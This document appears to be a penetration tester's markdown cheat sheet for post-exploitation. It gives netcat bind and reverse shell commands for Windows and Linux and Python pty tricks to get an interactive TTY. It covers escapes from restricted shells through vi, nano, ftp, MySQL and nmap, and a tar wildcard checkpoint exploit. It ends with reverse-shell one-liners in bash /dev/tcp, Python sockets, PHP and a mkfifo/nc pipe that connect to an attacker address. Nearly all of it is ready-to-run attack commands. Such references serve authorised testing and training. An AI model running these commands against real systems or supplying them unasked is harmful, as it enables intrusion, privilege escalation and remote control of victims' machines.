####netcat
#####Bind shell
+ On the victim
**Windows**    
`nc -nlvp <port> -e cmd.exe`
**Linux**    
`nc -nlvp <port> -e /bin/bash`

+ On the host
`nc -nv <victim ip> <port>`

#####Reverse
+ On the victim
**Windows**    
`nc -nv <host ip> <port> -e cmd.exe`    
**Linux**    
`nc -nv <host ip> <port> -e /bin/bash`

+ On the host    
`nc -lnvp <port>`

####Get interactive shell. TTY shell
####Python    
`python -c 'import pty; pty.spawn("/bin/sh")'`   
`python -c 'import pty; pty.spawn("/bin/bash")'`

#####Bash    
`echo os.system('/bin/bash')`

Check if it is interactive    
`[[ $- == *i* ]] && echo 'Interactive' || echo 'Not interactive'`

####Without TTY
http://pentestmonkey.net/blog/post-exploitation-without-a-tty    

####Escape a restricted shell (rbash) & programs that allow executing commands 
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells    

+ vi
```bash
sudo vi
:!/bin/bash
bash-3.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```

+ nano    
Use option `-s` to change spell checker program to `/bin/sh`    
`nano -s /bin/sh`    
Once inside type `/bin/bash` and hit `Ctrl-T`, this will escape rbash. You could also tpe `python`

+ ftp   
`ftp> !/bin/bash`

+ MySQL    
`mysql> \! /bin/bash`

+ tar    
Section 4.3 http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt    
If you can run a command similar to this: `tar cf /<tar file> *` you create files like the ones below to execute a script
```bash
echo "<commands>" > exploit.sh
touch /<path>/--checkpoint=1
touch /<path>/--checkpoint-action=exec=sh\ exploit.sh
```

+ nmap
```bash
nmap --interactive
nmap> !sh
```

#####Escape python lshell
`echo os.system(‘/bin/bash’)`

####Reverse shells
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
#####Netcat   
+ Linux Reverse    
`nc <ip> <port> -e '/bin/sh'`    
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 &1|nc <ip> <port> /tmp/f`
```bash
mknod /var/www/backpipe p
/bin/bash 0 < /var/www/backpipe | nc <ip> <port> 1 > /var/www/backpipe
```
http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498    
+ Linux Bind    
`nc -l -p <port> -e /bin/bash`    
+ Windows Reverse    
`nc <ip> <port> -e cmd.exe`    
+ Windows Bind    
`nc -l -p <port> -e cmd.exe`

#####Bash    
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

#####Python
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

#####PHP
`; php -r '$sock=fsockopen("<ip>",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

